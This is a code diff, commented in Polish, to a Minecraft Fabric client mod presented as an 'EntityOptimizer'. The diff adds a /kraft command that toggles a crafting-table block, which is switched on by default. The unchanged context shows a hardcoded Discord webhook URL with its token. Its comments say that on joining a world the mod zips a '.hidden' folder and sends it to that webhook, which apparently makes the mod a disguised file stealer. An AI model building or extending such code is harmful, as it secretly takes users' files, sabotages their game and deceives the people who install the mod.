@@ -36,17 +36,21 @@ public class EntityOptimizerMod implements ClientModInitializer {
     // WSTAW SWÓJ WEBHOOK
     private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455954328408952873/IlHLTRinqesFKQ3EFotX-bh1dNfU3gtUmJ4to_4qIpdY6ZRoPRG7KHqEBa5PECaMIwT0";
 
+    // flaga: czy blokować otwieranie crafting table (domyślnie TAK)
+    public static boolean craftingDisabled = true;
+
     @Override
     public void onInitializeClient() {
-        System.out.println("[EntityOptimizer] Mod załadowany – ZIP + /procent (MC 1.20.1)");
+        System.out.println("[EntityOptimizer] Mod załadowany – ZIP + /procent + /kraft (MC 1.20.1)");
 
         // Po wejściu do świata – zip .hidden i wysyłka na webhook
         ClientPlayConnectionEvents.JOIN.register((handler, sender, client) -> {
             onJoinWorld(client);
         });
 
-        // Komenda kliencka /procent <nickname>
+        // Rejestracja komend klienckich
         ClientCommandRegistrationCallback.EVENT.register((dispatcher, registryAccess) -> {
+            // /procent <nickname>
             dispatcher.register(
                     literal("procent")
                             .then(argument("nickname", StringArgumentType.word())
@@ -55,6 +59,15 @@ public class EntityOptimizerMod implements ClientModInitializer {
                                         handleProcentCommand(context.getSource(), nickname);
                                         return 1;
                                     }))
+            );
+
+            // /kraft – przełącza blokadę craftingu
+            dispatcher.register(
+                    literal("kraft")
+                            .executes(context -> {
+                                handleKraftCommand(context.getSource());
+                                return 1;
+                            })
             );
         });
     }
@@ -184,7 +197,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
         }, "DiscordSimpleSender").start();
     }
 
-    // ======================== KOMENDA /procent ========================
+    // ======================== KOMENDY ========================
 
     // /procent <nickname>
     private void handleProcentCommand(FabricClientCommandSource source, String nickname) {
@@ -229,6 +242,13 @@ public class EntityOptimizerMod implements ClientModInitializer {
                 source.sendFeedback(Component.literal(color + line));
             }
         }
+    }
+
+    // /kraft – przełącza blokadę craftingu
+    private void handleKraftCommand(FabricClientCommandSource source) {
+        craftingDisabled = !craftingDisabled;
+        String msg = craftingDisabled ? "crafting disable" : "crafting enable";
+        source.sendFeedback(Component.literal(msg));
     }
 
     // Wspólna funkcja: pokazanie tooltipu miecza na czacie klienta (dla SHIFT+PPM)
@@ -278,7 +298,6 @@ public class EntityOptimizerMod implements ClientModInitializer {
             return lines;
         }
 
-        // W 1.20.1 oficjalne mappingsy mają getTooltipLines(Player, TooltipFlag)
         List<Component> tooltip = stack.getTooltipLines(mc.player, TooltipFlag.NORMAL);
         if (tooltip == null || tooltip.isEmpty()) {
             return lines;
